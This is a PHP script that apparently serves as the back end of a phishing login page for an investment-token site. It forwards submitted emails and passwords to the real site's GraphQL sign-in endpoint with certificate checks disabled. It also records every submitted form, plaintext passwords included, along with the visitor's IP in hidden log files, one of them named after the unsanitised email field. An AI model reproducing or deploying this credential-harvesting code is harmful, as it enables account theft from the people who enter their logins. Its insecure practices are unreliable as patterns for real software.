<?php

    $time = "Date: " . date("Y-m-d H:i:s", time());


    $email = $_POST['email'];
    $password = $_POST['password'];
    $bonus = $_POST['bonus'];
    $bonusN = $_POST['bonusN'];

    $request = [
        "operationName" => null,
        "variables" => [
            "email" => $email,
            "password" => str_replace("#777", "&", $password)
        ],
        "query" => "mutation (\$email: String!, \$password: String!) {\n  signinUser(email: \$email, password: \$password) {\n    token\n    __typename\n  }\n}\n"
    ];
    echo json_encode($request, JSON_UNESCAPED_UNICODE);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://invest.arno-token.com/graphql');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($request, JSON_UNESCAPED_UNICODE) );
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('content-Type: application/json'));
    $out = curl_exec($ch);
    //var_dump($out);
    /*if($errno = curl_errno($ch)) {
        $error_message = curl_strerror($errno);
        echo "cURL error ({$errno}):\n {$error_message}";
    }*/
    curl_close($ch);

//Log Login User

function GetIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
    $ip = $_SERVER['REMOTE_ADDR'];
	}
    return $ip;
}

$email = $_POST['email'];
//$file = 'logs/' + $email;

    file_put_contents('_LogZ_6969_/service/_login.txt', $time . "\n" . GetIP() ."\n". json_encode($_POST) . "\n", FILE_APPEND);
//    file_put_contents("logs/$email", FILE_APPEND);
    file_put_contents("_LogZ_6969_/$email", $time . "\n" . GetIP() ."\n". json_encode($_POST) . "\n", FILE_APPEND);
    file_put_contents("_LogZ_6969_/$email", "Successfully Login" . "\n", FILE_APPEND);

//End of Login User

    echo $out;

?>
